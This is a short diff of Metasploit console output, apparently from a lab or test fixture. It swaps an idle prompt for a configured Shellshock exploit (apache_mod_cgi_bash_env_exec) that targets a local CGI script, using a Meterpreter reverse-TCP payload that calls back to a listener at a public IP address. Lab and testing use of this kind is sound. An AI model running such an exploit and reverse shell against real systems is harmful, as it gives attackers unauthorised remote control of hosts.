@@ -41,7 +41,12 @@
 + -- --=[ 592 payloads - 45 encoders - 10 nops            ]
 + -- --=[ 8 evasion                                       ]
 
-Metasploit tip: To save all commands executed since start up 
-to a file, use the makerc command
+Metasploit tip: When in a module, use back to go 
+back to the top level prompt
 
-msf6 > 
+[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
+RHOST => 127.0.0.1
+RPORT => 8081
+LHOST => 54.79.241.48
+targeturi => /cgi-bin/log-visitor.sh
+msf6 exploit(multi/http/apache_mod_cgi_bash_env_exec) > 
